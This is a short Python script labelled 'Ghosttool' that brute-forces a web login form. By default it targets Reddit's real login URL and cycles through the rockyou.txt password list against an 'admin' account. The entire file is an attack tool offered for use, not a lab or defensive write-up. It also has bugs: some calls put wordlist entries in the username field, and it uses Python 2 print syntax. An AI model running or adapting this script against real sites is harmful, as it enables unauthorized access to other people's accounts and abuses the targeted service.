import requests
import sys
import os
import time

os.system("figlet BRUTEFORCE")
print ("----------Ghosttool----------")
time.sleep(2)
print ("starting..")
time.sleep(2)


url =  'https://www.reddit.com/login/' #change url here
expression = "incorrect"
def brute(username,password):
	data = {'username':username,'password':password}
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		print r.content," ",password




def main():                              #note that you need rockyou.txt
	words = [w.strip() for w in open("rockyou.txt", "rb").readlines()] #parse wordlist
	for payload in words:
		brute(payload,"a")
		brute("admin",payload)


if __name__ == '__main__':
	main()
